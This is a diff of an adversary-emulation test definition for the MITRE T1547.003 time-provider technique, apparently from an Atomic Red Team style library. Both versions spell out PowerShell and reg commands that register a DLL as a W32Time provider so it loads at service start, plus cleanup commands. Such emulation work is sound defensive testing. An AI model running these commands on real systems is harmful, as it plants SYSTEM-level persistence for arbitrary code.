@@ -1,4 +1,4 @@
-- id: 2f3ec074-c3f3-596d-9698-e8463e4a6e0f
+- requirements: []
   name: Soumaia ART Tests - Create a new time provider
   description: 'Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider.
 
@@ -9,23 +9,16 @@
 
     Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/ (requires elevation)'
   tactic: privilege-escalation
-  technique:
-    attack_id: T1547.003
-    name: Time Providers
-  platforms:
-    windows:
-      psh:
-        command: |-
-          net stop w32time
-          Copy-Item "$.\AtomicTest.dll" C:\Users\Public\AtomicTest.dll
-          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f
-          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_DWORD /v "Enabled" /d "1" /f
-          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_DWORD /v "InputProvider" /d "1" /f
-          net start w32time
-        cleanup: |-
-          net stop w32time
-          reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /f
-          rm -force C:\Users\Public\AtomicTest.dll
-          net start w32time
-        payloads:
-        - AtomicTest.dll
+  technique_id: T1547.003
+  technique_name: Time Providers
+  executors:
+  - cleanup:
+    - net stop w32time; reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /f; rm -force C:\Users\Public\AtomicTest.dll; net start w32time
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - AtomicTest.dll
+    parsers: []
+    command: net stop w32time; Copy-Item "$.\AtomicTest.dll" C:\Users\Public\AtomicTest.dll; reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f; reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_DWORD /v "Enabled" /d "1" /f; reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest" /t REG_DWORD /v "InputProvider" /d "1" /f; net start w32time
+  id: 2f3ec074-c3f3-596d-9698-e8463e4a6e0f
